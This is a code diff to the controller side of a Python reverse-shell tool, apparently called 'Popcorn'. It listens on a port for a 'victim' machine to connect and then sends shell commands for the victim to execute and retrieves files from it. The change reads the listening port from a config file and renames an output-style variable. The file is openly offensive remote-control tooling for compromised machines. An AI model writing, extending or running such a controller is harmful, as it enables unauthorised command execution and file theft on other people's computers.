@@ -1,19 +1,31 @@
 import sys
+import os
+import json
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
 
 # Port listening for the victim's connection
-port = 7890
+port = 7777
 
 # Style out prompt and output
-output_style = "full"
+verbose = "full"
 exit_flag = False
+
+
+def load_settings():
+    global port
+    base_path = os.path.dirname(os.path.abspath(__file__))
+    data_path = os.path.join(base_path, 'config.json')
+    # Read the data file
+    with open(data_path) as f:
+        data = json.load(f)
+        port = int(data["Popcorn_Port"])
 
 
 # Custom command behaviour
 def parse_custom_command(cmd: list) -> list:
-    global output_style
+    global verbose
     global exit_flag
     if len(cmd) == 1:
         print("Emtpy command")
@@ -24,9 +36,9 @@ def parse_custom_command(cmd: list) -> list:
         exit_flag = True
         return cmd
     elif cmd[1] == "simple":
-        output_style = "simple"
+        verbose = "simple"
     elif cmd[1] == "full":
-        output_style = "full"
+        verbose = "full"
     elif cmd[1] == "file":
         if len(cmd) == 3:
             return cmd
@@ -41,7 +53,7 @@ def parse_custom_command(cmd: list) -> list:
 
 # Create the server socket that await the victim to connect to
 def create_socket():
-    global output_style
+    global verbose
     global exit_flag
     global port
 
@@ -51,7 +63,7 @@ def create_socket():
 
     # Receive data from the client
     while True:
-        prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
+        prompt = "Send command (type \"-> help\" to help): " if verbose == "full" else ">"
         command = input(prompt)
         command = command.split(" ")
 
@@ -88,7 +100,7 @@ def create_socket():
             with open(payload.file_name, "wb") as file:
                 file.write(payload.file)
         else:
-            print(payload.formatted_output(output_style))
+            print(payload.formatted_output(verbose))
 
 
 def show_logo():
@@ -126,8 +138,10 @@ Once connected, you can send shell command for the victim to execute
 '''
     print(content)
 
+
 def main():
     show_logo()
+    load_settings()
     if len(sys.argv) > 1:
         show_help()
         exit(0)
